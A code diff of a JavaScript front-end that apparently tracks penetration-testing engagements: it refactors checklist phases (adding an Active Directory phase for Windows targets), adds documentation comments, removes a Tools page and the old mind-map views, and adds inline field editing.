@@ -686,6 +625,7 @@ async function getEvidenceUsageBytes() {
   });
 }
 
+/** Calculate combined storage: localStorage state JSON + IndexedDB evidence blobs. */
 async function getAppUsageBytes() {
   const localRaw = localStorage.getItem(STORAGE_KEY) || '';
   const stateBytes = new TextEncoder().encode(localRaw).length;
@@ -697,19 +637,31 @@ async function getAppUsageBytes() {
   };
 }
 
+/* ───────────────────────────────────────────────
+  11. Routing Helpers
+   ─────────────────────────────────────────────── */
+
+/** Return the current hash path, e.g. “/”, “/timeline”, or “/machine/m4kx9z”. */
 function routePath() {
   return (window.location.hash.replace('#', '') || '/').trim();
 }
 
+/** Extract a machine ID from a path like “/machine/m4kx9z”.  Returns null if no match. */
 function parseMachineRoute(path) {
   const match = path.match(/^\/machine\/([^/]+)$/);
   return match ? match[1] : null;
 }
 
+/* ───────────────────────────────────────────────
+  12. Date / Time Formatters
+   ─────────────────────────────────────────────── */
+
+/** Current time as an ISO-8601 string (used for timestamps on new records). */
 function nowStamp() {
   return new Date().toISOString();
 }
 
+/** Full locale date string: "Jan 5, 2025, 14:32:18". */
 function formatDate(value) {
   return new Date(value).toLocaleString(undefined, {
     month: 'short',
@@ -722,6 +674,7 @@ function formatDate(value) {
   });
 }
 
+/** Short locale date: "Jan 5, 14:32". */
 function formatShort(value) {
   return new Date(value).toLocaleString(undefined, {
     month: 'short',
@@ -732,10 +685,12 @@ function formatShort(value) {
   });
 }
 
+/** Time-only string in 24-hour format. */
 function formatTime(value) {
   return new Date(value).toLocaleTimeString(undefined, { hour12: false });
 }
 
+/** Military-style timestamp: "14:32:18 05/01/25". */
 function formatDateTimeMilitary(value) {
   if (!value) return '—';
   const d = new Date(value);
@@ -749,6 +704,7 @@ function formatDateTimeMilitary(value) {
   return `${hh}:${mi}:${ss} ${dd}/${mm}/${yy}`;
 }
 
+/** Human-friendly relative time string: "3 minutes ago", "about 2 hours ago". */
 function relative(value) {
   const diff = Date.now() - new Date(value).getTime();
   const mins = Math.max(1, Math.floor(diff / 60000));
@@ -757,6 +713,11 @@ function relative(value) {
   return `about ${hours} hour${hours !== 1 ? 's' : ''} ago`;
 }
 
+/* ───────────────────────────────────────────────
+  13. Byte Formatting & Storage Meters
+   ─────────────────────────────────────────────── */
+
+/** Convert a raw byte count to a human-friendly string like "1.23 MB". */
 function formatBytes(bytes) {
   if (!Number.isFinite(bytes) || bytes <= 0) return '0 B';
   const units = ['B', 'KB', 'MB', 'GB', 'TB'];
@@ -770,6 +731,10 @@ function formatBytes(bytes) {
   return `${value.toFixed(digits)} ${units[unitIndex]}`;
 }
 
+/**
+ * Refresh the storage meter labels on the dashboard.  Reads both the app
+ * usage (localStorage + IndexedDB) and the browser Storage API quota.
+ */
 async function updateStorageMeters() {
   const appMeter = document.getElementById('appStorageMeter');
   const browserMeter = document.getElementById('browserStorageMeter');
@@ -802,6 +767,13 @@ async function updateStorageMeters() {
   }
 }
 
+/* ───────────────────────────────────────────────
+  14. Checklist Port Filtering & Applicability
+   Determines which checklist items are visible for a given machine
+   based on selected recon ports, OS type, and phase.
+   ─────────────────────────────────────────────── */
+
+/** Parse port numbers from an item name like "SMB (445)" → ["445"]. */
 function extractPortsFromReconItem(item) {
   const match = item.name.match(/\(([^)]+)\)/);
   if (!match) return [];
@@ -809,6 +781,7 @@ function extractPortsFromReconItem(item) {
   return Array.from(new Set(ports));
 }
 
+/** Collect all unique port numbers referenced in the recon phase items. */
 function getReconPortOptions() {
   const reconPhase = checklistPhases.find((phase) => phase.id === 'recon');
   if (!reconPhase) return [];
@@ -819,7 +792,16 @@ function getReconPortOptions() {
   return Array.from(portSet).sort((a, b) => Number(a) - Number(b));
 }
 
+/**
+ * Decide whether a checklist item applies to the given machine.
+ * Filters on: AD phase (windows-only), recon port selection,
+ * and OS-prefixed items ("Linux:" / "Windows:") in exploitation phases.
+ */
 function isItemApplicableForMachine(machine, phaseId, item) {
+  if (phaseId === AD_CHECKLIST_PHASE_ID) {
+    return machine.os_type === 'windows';
+  }
+
   if (phaseId === 'recon') {
     const selectedPorts = new Set(machine.selected_ports || []);
     if (!selectedPorts.size) return true;
@@ -828,35 +810,40 @@ function isItemApplicableForMachine(machine, phaseId, item) {
     return itemPorts.some((port) => selectedPorts.has(port));
   }
 
-  if (phaseId === 'post_exploitation') {
+  const OS_FILTERED_PHASES = ['exploitation', 'post_exploitation', 'persistence'];
+  if (OS_FILTERED_PHASES.includes(phaseId)) {
     const itemName = (item.name || '').toLowerCase();
     if (itemName.startsWith('linux:')) return machine.os_type === 'linux';
     if (itemName.startsWith('windows:')) return machine.os_type === 'windows';
-    return true;
-  }
-
-  if (phaseId === 'persistence') {
-    const itemName = (item.name || '').toLowerCase();
-    if (itemName.startsWith('linux:')) return machine.os_type === 'linux';
-    if (itemName.startsWith('windows:')) return machine.os_type === 'windows';
-    return true;
   }
 
   return true;
 }
 
+/* ───────────────────────────────────────────────
+  15. Checklist / Finding Lookups
+   ─────────────────────────────────────────────── */
+
+/** Find a checklist item by ID across all phases (uses Windows catalog for completeness). */
 function checklistItemById(itemId) {
-  return checklistPhases.flatMap((phase) => phase.items).find((item) => item.id === itemId) || null;
+  return checklistPhaseCatalogForMachine({ os_type: 'windows' }).flatMap((phase) => phase.items).find((item) => item.id === itemId) || null;
 }
 
+/** Find which phase contains the given checklist item ID. */
 function checklistPhaseForItem(itemId) {
-  return checklistPhases.find((phase) => phase.items.some((item) => item.id === itemId)) || null;
+  return checklistPhaseCatalogForMachine({ os_type: 'windows' }).find((phase) => phase.items.some((item) => item.id === itemId)) || null;
 }
 
+/* ───────────────────────────────────────────────
+  16. UI Feedback Helpers
+   ─────────────────────────────────────────────── */
+
+/** Convert an activity action string like "add_machine" → "Add Machine". */
 function formatActionLabel(action) {
   return String(action || '').replace(/_/g, ' ').replace(/\b\w/g, (char) => char.toUpperCase());
 }
 
+/** Show a brief floating "Copied!" toast near the given anchor element. */
 function showCopyFeedback(anchor, message = 'Copied!') {
   if (!anchor) return;
   document.querySelectorAll('.copy-feedback-toast').forEach((toast) => toast.remove());
@@ -879,13 +866,19 @@ function showCopyFeedback(anchor, message = 'Copied!') {
   }, 900);
 }
 
+/* ───────────────────────────────────────────────
+  17. Progress Calculators
+   ─────────────────────────────────────────────── */
+
+/** All checklist items applicable to this machine (respects OS + port filters). */
 function getApplicableItems(machine) {
-  return checklistPhases.reduce((items, phase) => {
+  return checklistPhaseCatalogForMachine(machine).reduce((items, phase) => {
     const filteredItems = phase.items.filter((item) => isItemApplicableForMachine(machine, phase.id, item));
     return [...items, ...filteredItems];
   }, []);
 }
 
+/** Percentage (0–100) of items completed within a single checklist phase. */
 function getPhaseProgress(phase, completedItems) {
   const total = phase.items.length;
   if (!total) return 0;
@@ -893,6 +886,7 @@ function getPhaseProgress(phase, completedItems) {
   return Math.round((completed / total) * 100);
 }
 
+/** Overall checklist progress (0–100) across all applicable phases for a machine. */
 function getTotalProgress(machine) {
   const applicable = getApplicableItems(machine);
   if (!applicable.length) return 0;
@@ -900,6 +894,11 @@ function getTotalProgress(machine) {
   return Math.round((completed / applicable.length) * 100);
 }
 
+/* ───────────────────────────────────────────────
+  18. Activity Logger
+   ─────────────────────────────────────────────── */
+
+/** Push a timestamped activity entry to the front of state.activities. */
 function addActivity(action, details, machineId) {
   state.activities.unshift({
     id: uid('a'),
@@ -910,31 +909,43 @@ function addActivity(action, details, machineId) {
   });
 }
 
+/* ───────────────────────────────────────────────
+  19. Data Accessors
+   Convenience functions for querying the in-memory state.
+   ─────────────────────────────────────────────── */
+
+/** Look up a machine object by its ID. */
 function machineById(id) {
   return state.machines.find((machine) => machine.id === id);
 }
 
+/** All credentials associated with a machine. */
 function machineCredentials(machineId) {
   return state.credentials.filter((credential) => credential.machine_id === machineId);
 }
 
+/** Map a phase ID to its brand colour hex string (used in SVG & inline styles). */
 function phaseColor(pid) {
   if (pid === 'osint') return '#a78bfa';
   if (pid === 'recon') return '#22d3ee';
   if (pid === 'exploitation') return '#f97316';
+  if (pid === AD_CHECKLIST_PHASE_ID) return '#facc15';
   if (pid === 'post_exploitation') return '#f43f5e';
   if (pid === 'persistence') return '#3b82f6';
   return 'var(--text)';
 }
 
+/** All findings belonging to a machine (active + archived). */
 function machineFindings(machineId) {
   return state.findings.filter((finding) => finding.machine_id === machineId);
 }
 
+/** Activity log entries scoped to a specific machine. */
 function machineActivity(machineId) {
   return state.activities.filter((activity) => activity.machine_id === machineId);
 }
 
+/** Total evidence file count for a machine (findings + checklist items). */
 function machineEvidenceCount(machineId) {
   const findingEvidence = machineFindings(machineId).reduce((sum, f) => sum + (f.evidence || []).length, 0);
   const machine = machineById(machineId);
@@ -942,6 +953,11 @@ function machineEvidenceCount(machineId) {
   return findingEvidence + itemEvidence;
 }
 
+/* ───────────────────────────────────────────────
+  20. Navigation
+   ─────────────────────────────────────────────── */
+
+/** Highlight the active sidebar nav link based on the current hash route. */
 function setNav() {
   const path = routePath();
   document.querySelectorAll('.nav-item').forEach((item) => {
@@ -951,6 +967,14 @@ function setNav() {
   });
 }
 
+/* ───────────────────────────────────────────────
+  21. Renderers
+   Each render* function returns an HTML string.  After injection
+   into the DOM via innerHTML, a matching wire* function attaches
+   the event listeners.
+   ─────────────────────────────────────────────── */
+
+/** Render the dashboard page: machine cards grid with progress, status, and storage meters. */
 function renderDashboard() {
   const cards = state.machines.map((machine, index) => {
     const status = statusConfig[machine.status] || statusConfig.pending;
@@ -997,153 +1021,7 @@ function renderDashboard() {
   `;
 }
 
-function renderTools() {
-  return `
-    <section>
-      <div class="header-row">
-        <div>
-          <h1>🧰 Tools</h1>
-          <div class="sub">Documentation hub for tools, how-tos, and wiki notes</div>
-        </div>
-      </div>
-      <div class="grid">
-        <article class="card">
-          <h3 class="subhead" style="margin-bottom:.55rem">Recon</h3>
-          <div class="small">Nmap workflows, service enumeration cheat-sheets, and quick command playbooks.</div>
-        </article>
-        <article class="card">
-          <h3 class="subhead" style="margin-bottom:.55rem">Web</h3>
-          <div class="small">Burp workflows, content discovery notes, and SQLi/LFI/RFI testing references.</div>
-        </article>
-        <article class="card">
-          <h3 class="subhead" style="margin-bottom:.55rem">AD / Internal</h3>
-          <div class="small">BloodHound, Kerberos attacks, WinRM/SMB lateral movement, and AD post-exploitation notes.</div>
-        </article>
-        <article class="card">
-          <h3 class="subhead" style="margin-bottom:.55rem">Privilege Escalation</h3>
-          <div class="small">Linux and Windows privilege escalation checklists and GTFOBins/LOLBAS references.</div>
-        </article>
-      </div>
-      <div class="card" style="margin-top:.9rem">
-        <h3 class="subhead" style="margin-bottom:.55rem">Usage</h3>
-        <div class="small">Use this page as a centralized wiki for your tooling notes, procedures, and engagement runbooks.</div>
-      </div>
-    </section>
-  `;
-}
-
-function renderCredentialRows(filter = '') {
-  const q = filter.trim().toLowerCase();
-  const rows = state.credentials.filter((credential) => {
-    if (!q) return true;
-    const machine = machineById(credential.machine_id);
-    return credential.username.toLowerCase().includes(q)
-      || credential.service.toLowerCase().includes(q)
-      || machine?.ip.toLowerCase().includes(q);
-  });
-
-  const html = rows.map((credential) => {
-    const machine = machineById(credential.machine_id);
-    const shown = state.reveal[credential.id];
-    return `
-      <tr>
-        <td class="mono" style="color:var(--green)">${machine?.ip || 'Unknown'}</td>
-        <td class="mono">${credential.username}</td>
-        <td class="mono" style="color:var(--muted)">${shown ? credential.password : '••••••••'}</td>
-        <td><span class="badge">${credential.cred_type}</span></td>
-        <td>${credential.service || '-'}</td>
-        <td class="small mono dim">${formatShort(credential.created_at)}</td>
-        <td>
-          <div class="actions">
-            <button class="icon-btn" data-action="reveal" data-id="${credential.id}">${shown ? '🙈' : '👁'}</button>
-            <button class="icon-btn" data-action="copy" data-id="${credential.id}">⧉</button>
-            <button class="icon-btn" data-action="delete" data-id="${credential.id}">🗑</button>
-          </div>
-        </td>
-      </tr>
-    `;
-  }).join('');
-
-  document.getElementById('credTable').innerHTML = html || '<tr><td colspan="7" class="empty">No credentials stored yet</td></tr>';
-}
-
-function renderMindMap() {
-  const tree = state.ui.mindmapMode === 'tree';
-  return `
-    <section style="height:100%">
-      <div class="header-row">
-        <div>
-          <h1>◎ Mind Map</h1>
-          <div class="sub">Visualize your engagement findings</div>
-        </div>
-        <div class="view-switch">
-          <button class="${tree ? 'active' : ''}" data-mode="tree">Tree</button>
-          <button class="${!tree ? 'active' : ''}" data-mode="hierarchy">Hierarchy</button>
-        </div>
-      </div>
-      <div class="canvas" id="mindmapCanvas"></div>
-    </section>
-  `;
-}
-
-function renderMindMapBody() {
-  const host = document.getElementById('mindmapCanvas');
-  if (!host) return;
-
-  if (!state.machines.length) {
-    host.innerHTML = '<div class="empty">Add machines and findings to see the mind map</div>';
-    return;
-  }
-
-  if (state.ui.mindmapMode === 'tree') {
-    host.innerHTML = `
-      <div class="node-root">Security Tracker</div>
-      <div class="tree-grid">
-        ${state.machines.map((machine) => {
-          const findings = machineFindings(machine.id);
-          const credentials = machineCredentials(machine.id);
-          return `
-            <div class="node">
-              <div class="mono" style="font-size:.8rem">${machine.ip}</div>
-              <div class="small">${machine.os_type.toUpperCase()} · ${(statusConfig[machine.status]?.label || machine.status).toUpperCase()}</div>
-              ${findings.map((finding) => `<div style="margin-top:.45rem;font-size:.75rem;color:${finding.severity === 'critical' || finding.severity === 'high' ? '#f97316' : '#f59e0b'}">• ${finding.title}</div>`).join('')}
-              ${credentials.map((credential) => `<div style="margin-top:.3rem;font-size:.75rem;color:var(--amber)">• ${credential.username} (${credential.service || credential.cred_type})</div>`).join('')}
-            </div>
-          `;
-        }).join('')}
-      </div>
-    `;
-    return;
-  }
-
-  host.innerHTML = state.machines.map((machine) => {
-    const findings = machineFindings(machine.id);
-    const credentials = machineCredentials(machine.id);
-    return `
-      <div class="accordion-item">
-        <button class="accordion-head" data-acc="${machine.id}">
-          <span class="status-dot ${statusConfig[machine.status]?.colorClass || 'status-pending'}"></span>
-          <span class="mono" style="font-size:.8rem">${machine.ip}</span>
-          <span class="badge">${machine.os_type.toUpperCase()}</span>
-          <span class="small" style="text-transform:uppercase">${statusConfig[machine.status]?.label || machine.status}</span>
-        </button>
-        <div class="accordion-body" id="acc-${machine.id}" style="display:none">
-          ${findings.length ? `<div style="margin-bottom:.7rem"><div class="small" style="margin-bottom:.3rem">Findings (${findings.length})</div>${findings.map((finding) => `<div class="small">• ${finding.title} [${finding.severity}]</div>`).join('')}</div>` : ''}
-          ${credentials.length ? `<div><div class="small" style="margin-bottom:.3rem">Credentials (${credentials.length})</div>${credentials.map((credential) => `<div class="small mono">• ${credential.username} (${credential.service || credential.cred_type})</div>`).join('')}</div>` : ''}
-          ${!findings.length && !credentials.length ? '<div class="small dim">No findings or credentials yet</div>' : ''}
-        </div>
-      </div>
-    `;
-  }).join('');
-
-  host.querySelectorAll('.accordion-head').forEach((button) => {
-    button.addEventListener('click', () => {
-      const pane = document.getElementById(`acc-${button.dataset.acc}`);
-      pane.style.display = pane.style.display === 'none' ? 'block' : 'none';
-    });
-  });
-}
-
+/** Render the global activity timeline page, grouped by calendar day. */
 function renderTimeline() {
   const grouped = state.activities.reduce((acc, activity) => {
     const day = new Date(activity.timestamp).toDateString();
@@ -1184,14 +1062,14 @@ function renderTimeline() {
   `;
 }
 
+/** Replace <TARGET_IP> placeholders in checklist commands with the machine’s actual IP. */
 function substituteTargetIp(cmd, ip) {
   return cmd.replace(/<TARGET_IP>|<target-ip>|<TARGET-IP>|<Target-IP>|<Target-ip>/gi, ip);
 }
 
+/** Return the filterable, OS-specific set of checklist phases for a machine. */
 function checklistPhasesFor(machine) {
-  const activePhases = checklistPhases.filter((phase) => {
-    return true;
-  });
+  const activePhases = checklistPhaseCatalogForMachine(machine);
 
   return activePhases
     .map((phase) => ({
@@ -1201,14 +1079,21 @@ function checklistPhasesFor(machine) {
     .filter((phase) => phase.items.length > 0);
 }
 
+/** Emoji icons mapped to each phase ID (used in accordion headers and mind map). */
 const PHASE_EMOJI = {
   osint:            '🔍',
   recon:            '📡',
   exploitation:     '💥',
+  [AD_CHECKLIST_PHASE_ID]: '🪟',
   post_exploitation:'🦾',
   persistence:      '🔒',
 };
 
+/**
+ * Render the interactive checklist accordion for a machine detail page.
+ * Includes port filter bar, phase accordions with check items, command blocks,
+ * evidence dropzones, and completed/incomplete task filter toggles.
+ */
 function renderChecklist(machine) {
   const completedItems = machine.completed_items || [];
   const allPhases = checklistPhasesFor(machine);
@@ -1283,9 +1168,10 @@ function renderChecklist(machine) {
                         <input type="checkbox" data-check-item="${item.id}" ${done ? 'checked' : ''}>
                         <span class="${done ? 'line' : ''}" style="user-select:text;cursor:default;">${item.name}</span>
                       </div>
+                      ${item.description ? `<div class="small dim" style="margin:.3rem 0 .15rem 1.75rem;line-height:1.45">${item.description}</div>` : ''}
                       ${item.commands ? item.commands.map((c, ci) => `
-                        <div class="cmd-sub-desc">${c.desc}</div>
-                        ${c.subdesc ? `<div class="cmd-sub-desc" style="font-size:.78rem;color:var(--muted);margin-top:.15rem;font-style:italic">${c.subdesc}</div>` : ''}
+                        <div class="cmd-sub-desc cmd-sub-desc-main">${c.desc}</div>
+                        ${c.subdesc ? `<div class="cmd-sub-desc cmd-sub-desc-sub">${c.subdesc}</div>` : ''}
                         <div class="cmd-block mt-2">
                           <pre>${substituteTargetIp(c.cmd, machine.ip).replace(/</g, '&lt;')}</pre>
                           <button class="cmd-copy" data-copy-raw-idx="${item.id}__${ci}">Copy</button>
@@ -1326,6 +1212,7 @@ function renderChecklist(machine) {
   `;
 }
 
+/** Render the credentials table tab with an inline add form for a machine. */
 function renderMachineCredentialsTab(machine) {
   const credentials = machineCredentials(machine.id);
 
@@ -1344,10 +1231,7 @@ function renderMachineCredentialsTab(machine) {
           <label>Password / Hash<input id="mcPassword"></label>
           <label>Type
             <select id="mcType">
-              <option value="plain">Plain Text</option>
-              <option value="hash">Hash</option>
-              <option value="key">SSH Key</option>
-              <option value="token">Token</option>
+              ${credTypeOptionsHtml()}
             </select>
           </label>
           <div class="modal-actions">
@@ -1391,6 +1275,12 @@ function renderMachineCredentialsTab(machine) {
   `;
 }
 
+/**
+ * Recursively build finding cards with parent→child nesting.
+ * @param {Array} allFindings - All findings for the machine
+ * @param {string|null} parentId - Parent finding ID (null for root)
+ * @param {number} depth - Nesting depth for visual indentation
+ */
 function buildFindingCards(allFindings, parentId, depth) {
   const children = allFindings.filter(f => (f.parent_id || null) === (parentId || null));
   return children.map(finding => {
@@ -1429,8 +1319,10 @@ function buildFindingCards(allFindings, parentId, depth) {
   }).join('');
 }
 
+/** Render the findings list tab with inline add form and nested finding cards. */
 function renderFindingsTab(machine) {
   const findings = machineFindings(machine.id);
+  const machinePhases = checklistPhaseCatalogForMachine(machine);
 
   return `
     <div class="mt-4">
@@ -1445,31 +1337,17 @@ function renderFindingsTab(machine) {
           <div class="split">
             <label>Severity
               <select id="findingSeverity">
-                <option value="critical">Critical</option>
-                <option value="high" selected>High</option>
-                <option value="medium">Medium</option>
-                <option value="low">Low</option>
-                <option value="info">Info</option>
+                ${severityOptionsHtml('high')}
               </select>
             </label>
             <label>Phase
-              <select id="findingPhase">${checklistPhases.map((phase) => `<option value="${phase.id}">${phase.name}</option>`).join('')}</select>
+              <select id="findingPhase">${phaseOptionsHtml(machinePhases)}</select>
             </label>
           </div>
           <label>Parent Finding
             <select id="findingParentId">
               <option value="">Root Level (no parent)</option>
-              ${(() => {
-                const firstPhase = checklistPhases[0]?.id || '';
-                const ep = buildEligibleParents(machine.id, firstPhase, new Set());
-                let opts = ep.samePhase.map(f => `<option value="${f.id}">${f.title} [${f.severity}]</option>`).join('');
-                if (ep.crossPhase.length) {
-                  opts += `<optgroup label="Cross-phase (${ep.prevPhaseId})">` +
-                    ep.crossPhase.map(f => `<option value="${f.id}">${f.title} [${f.severity}]</option>`).join('') +
-                    '</optgroup>';
-                }
-                return opts;
-              })()}
+              ${parentFindingOptionsHtml(machine.id, machinePhases[0]?.id || '', new Set(), null, machine)}
             </select>
           </label>
           <input id="findingEvidence" type="file" accept="image/*" multiple style="display:none">
@@ -1490,6 +1368,7 @@ function renderFindingsTab(machine) {
   `;
 }
 
+/** Render the notes tab — a simple auto-saving textarea for per-machine notes. */
 function renderNotesTab(machine) {
   return `
     <div class="mt-4">
@@ -1500,6 +1379,11 @@ function renderNotesTab(machine) {
   `;
 }
 
+/**
+ * Render an inline credential panel below the mind map.
+ * Shows up to MAX_VISIBLE credentials with reveal/hide toggle;
+ * overflow triggers a link to the full credentials modal.
+ */
 function renderCredInlinePanel(machine) {
   const creds = machineCredentials(machine.id);
   const MAX_VISIBLE = 6;
@@ -1531,24 +1415,44 @@ function renderCredInlinePanel(machine) {
   `;
 }
 
+/**
+ * Render the machine mind map visualisation.
+ *
+ * Supported views:
+ * • Default ("all" phase) — quadrant grid showing all phases with SVG
+ *   leaf connectors for parent→child relationships.
+ * • Single-phase — day-column layout grouping findings by creation date.
+ * • Fullscreen — free-form draggable block workspace with SVG connectors.
+ *
+ * Also renders the phase filter bar, zoom controls, and unlinked credentials.
+ */
 function renderMachineMindMap(machine) {
   const allFindings = machineFindings(machine.id);
   const allCreds    = machineCredentials(machine.id);
   const isFullscreenView = mmFsMachineId === machine.id;
-  const activePhase = state.ui.mmPhase || 'all';
-  const isPreviewMode = !isFullscreenView;
+  const machinePhases = checklistPhaseCatalogForMachine(machine);
+  const phaseLabel = (phase) => {
+    if (phase.id === 'osint') return 'OSINT';
+    if (phase.id === 'recon') return 'Enumeration';
+    if (phase.id === 'post_exploitation') return 'Post-Exploit';
+    return phase.name;
+  };
 
   const PHASE_DEFS = [
-    { id: 'all',              label: 'Default',         col: '#94a3b8' },
-    { id: 'osint',            label: 'OSINT',           col: '#a78bfa' },
-    { id: 'recon',            label: 'Enumeration',     col: '#22d3ee' },
-    { id: 'exploitation',     label: 'Exploitation',    col: '#f97316' },
-    { id: 'post_exploitation',label: 'Post-Exploit',    col: '#f43f5e' },
-    { id: 'persistence',      label: 'Persistence',     col: '#3b82f6' },
+    { id: 'all', label: 'Default', col: '#94a3b8' },
+    ...machinePhases.map((phase) => ({
+      id: phase.id,
+      label: phaseLabel(phase),
+      col: phaseColor(phase.id),
+    })),
   ];
 
+  const activePhaseRaw = state.ui.mmPhase || 'all';
+  const activePhase = PHASE_DEFS.some((phaseDef) => phaseDef.id === activePhaseRaw) ? activePhaseRaw : 'all';
+  const isPreviewMode = !isFullscreenView;
+
   /* ── Phase order for cross-phase parenting ── */
-  const PHASE_ORDER = ['osint', 'recon', 'exploitation', 'post_exploitation', 'persistence'];
+  const PHASE_ORDER = machinePhases.map((phase) => phase.id);
 
   const vpId     = 'mm-vp-'     + machine.id;
   const canvasId = 'mm-canvas-' + machine.id;
@@ -1690,7 +1594,6 @@ function renderMachineMindMap(machine) {
        - it has no parent_id, OR
        - its parent doesn't exist, OR
        - its parent is in a DIFFERENT phase (cross-phase parent) */
-  const phaseOrder = checklistPhases.map(p => p.id);
   const byPhase = {};
   allFindings.forEach(f => {
     const parent = f.parent_id ? allFindings.find(p => p.id === f.parent_id) : null;
@@ -1701,7 +1604,7 @@ function renderMachineMindMap(machine) {
     byPhase[pid].push(f);
   });
 
-  const fixedIds = ['osint','recon','exploitation','post_exploitation','persistence'];
+  const fixedIds = [...PHASE_ORDER];
   /* Include any findings with unexpected/legacy phases */
   Object.keys(byPhase).forEach(pid => {
     if (!fixedIds.includes(pid)) fixedIds.push(pid);
@@ -1711,14 +1614,14 @@ function renderMachineMindMap(machine) {
     // use short label from PHASE_DEFS if available
     const def = PHASE_DEFS.find(d => d.id === id);
     if (def && def.label !== 'Default') return def.label;
-    const p = checklistPhases.find(ph => ph.id === id);
+    const p = machinePhases.find(ph => ph.id === id);
     return p ? p.name : id;
   };
 
   let canvasContent;
   if (activePhase === 'all') {
     /* ── Default + Fullscreen: draggable free-form blocks, left-to-right ── */
-    const fsPhaseIds = ['osint', 'recon', 'exploitation', 'post_exploitation', 'persistence'];
+    const fsPhaseIds = [...PHASE_ORDER];
     /* Include any findings with unexpected/legacy phases */
     Object.keys(byPhase).forEach(pid => {
       if (!fsPhaseIds.includes(pid)) fsPhaseIds.push(pid);
@@ -1754,109 +1657,9 @@ function renderMachineMindMap(machine) {
     const col   = phaseColor(activePhase);
     const name  = phaseName(activePhase);
 
-    /* In preview mode, render day-columns (max 5 days);
-       older findings become "Archived".
-       In fullscreen, keep the full leaf-group tree. */
-    const phaseBody = (() => {
-      if (!items.length)
-        return '<p class="small dim" style="margin:.75rem 0 .25rem">No findings in this phase yet.</p>';
-
-      if (isPreviewMode) {
-        const pColor = phaseColor(activePhase);
-
-        /* ---- bucket findings by calendar day ---- */
-        const toDay = (stamp) => {
-          if (!stamp) return 'unknown';
-          const d = new Date(stamp);
-          if (isNaN(d)) return 'unknown';
-          return d.toISOString().slice(0, 10);          // "YYYY-MM-DD"
-        };
-        const byDay = {};
-        items.forEach(f => {
-          const day = toDay(f.created_at);
-          if (!byDay[day]) byDay[day] = [];
-          byDay[day].push(f);
-        });
-        // Sort days descending (newest first)
-        const sortedDays = Object.keys(byDay).sort((a, b) => (b > a ? 1 : b < a ? -1 : 0));
-
-        const MAX_DAYS = 5;
-        const recentDays   = sortedDays.slice(0, MAX_DAYS);
-        const archivedDays = sortedDays.slice(MAX_DAYS);
-        const archivedFindings = archivedDays.flatMap(d => byDay[d]);
-
-        /* ---- render a finding row ---- */
-        const renderItem = (f) => {
-          const sColor = sevColor(f.severity);
-          const evCount = (f.evidence || []).length;
-          const crCount = allCreds.filter(c => c.finding_id === f.id).length;
-          const countParts = [];
-          if (evCount) countParts.push(`📓 ${evCount}`);
-          if (crCount) countParts.push(`🔑 ${crCount}`);
-          const countText = countParts.join('  ');
-          return `
-            <button class="mm-day-item" data-finding-view="${f.id}" type="button" style="--node-sev:${sColor}">
-              <span class="mm-day-item-title">${f.title}</span>
-              ${countText ? `<span class="mm-day-item-badge">${countText}</span>` : ''}
-            </button>`;
-        };
-
-        /* ---- format day label ---- */
-        const fmtDayLabel = (iso) => {
-          if (iso === 'unknown') return 'Unknown';
-          const d = new Date(iso + 'T00:00:00');
-          const today = new Date(); today.setHours(0,0,0,0);
-          const diff = Math.round((today - d) / 86400000);
-          const short = d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
-          if (diff === 0) return `Today · ${short}`;
-          if (diff === 1) return `Yesterday · ${short}`;
-          return short;
-        };
-
-        /* ---- archived bar ---- */
-        const archivedBar = archivedFindings.length ? `
-          <div class="mm-archived-bar" data-mm-toggle-archived>
-            <span class="mm-archived-icon">📦</span>
-            <span class="mm-archived-label">Archived Findings</span>
-            <span class="mm-archived-count">${archivedFindings.length}</span>
-            <span class="mm-archived-chevron">▸</span>
-          </div>
-          <div class="mm-archived-panel" style="display:none">
-            <div class="mm-archived-list">
-              ${archivedFindings.map(f => renderItem(f)).join('')}
-            </div>
-          </div>
-        ` : '';
-
-        /* ---- day columns ---- */
-        const dayColumns = recentDays.map(day => {
-          const dayFindings = byDay[day];
-          return `
-            <div class="mm-day-col">
-              <div class="mm-day-col-header">
-                <span class="mm-day-col-label">${fmtDayLabel(day)}</span>
-                <span class="mm-day-col-count">${dayFindings.length}</span>
-              </div>
-              <div class="mm-lane-scroll-wrap">
-                <button class="mm-lane-arrow mm-lane-arrow--up" type="button" aria-label="Scroll up">&#x25B2;</button>
-                <div class="mm-day-col-body">
-                  ${dayFindings.map(f => renderItem(f)).join('')}
-                </div>
-                <button class="mm-lane-arrow mm-lane-arrow--down" type="button" aria-label="Scroll down">&#x25BC;</button>
-              </div>
-            </div>`;
-        }).join('');
-
-        return `
-          ${archivedBar}
-          <div class="mm-day-grid" style="--phase-col:${pColor};--day-cols:${recentDays.length}">
-            ${dayColumns}
-          </div>`;
-      }
-
-      /* fullscreen: full tree */
-      return `<div class="mm-single-leaves">${items.map(f => renderLeafGroup(f)).join('')}</div>`;
-    })();
+    const phaseBody = !items.length
+      ? '<p class="small dim" style="margin:.75rem 0 .25rem">No findings in this phase yet.</p>'
+      : `<div class="mm-single-leaves">${items.map(f => renderLeafGroup(f)).join('')}</div>`;
 
     canvasContent = `
       <div class="mm-single-phase" style="--phase-col:${col}">
@@ -1880,6 +1683,15 @@ function renderMachineMindMap(machine) {
   `;
 }
 
+/**
+ * Render the full machine detail page:
+ * • Machine header (IP, hostname, status, OS, progress bar)
+ * • Mind map visualisation
+ * • Checklist accordion (default tab)
+ * • Sidebar with modal-open tabs (Credentials, Findings, Evidence, Notes)
+ * • Section Table of Contents for the checklist
+ * • Recent activity feed
+ */
 function renderMachineDetail(machine) {
   const progress = getTotalProgress(machine);
   const recentActivity = machineActivity(machine.id).slice(0, 20);
@@ -1894,7 +1706,8 @@ function renderMachineDetail(machine) {
       <div class="machine-top">
         <div>
           <div class="machine-title-row">
-            <h1 class="mono" style="font-size:3.1rem">🖥 ${machine.ip}</h1>
+            <h1 class="mono machine-ip-copy" style="font-size:3.1rem;cursor:pointer" title="Click to copy IP" data-copy-ip="${machine.ip}">🖥 ${machine.ip}</h1>
+            <button class="icon-btn edit-inline-btn" data-edit-field="ip" title="Edit IP">✎</button>
           </div>
           <p class="small machine-created mono">Created: ${formatDate(machine.created_at)}</p>
         </div>
@@ -1917,8 +1730,8 @@ function renderMachineDetail(machine) {
             </div>
           </div>
           <div class="machine-right-meta">
-            <p class="small mono machine-meta-line">Operating System: ${machine.os_type === 'windows' ? 'Windows' : 'Linux'}</p>
-            <p class="small mono machine-meta-line">Domain Name: ${machine.hostname || '-'}</p>
+            <p class="small mono machine-meta-line">Operating System: ${machine.os_type === 'windows' ? 'Windows' : 'Linux'} <button class="icon-btn edit-inline-btn" data-edit-field="os_type" title="Edit OS">✎</button></p>
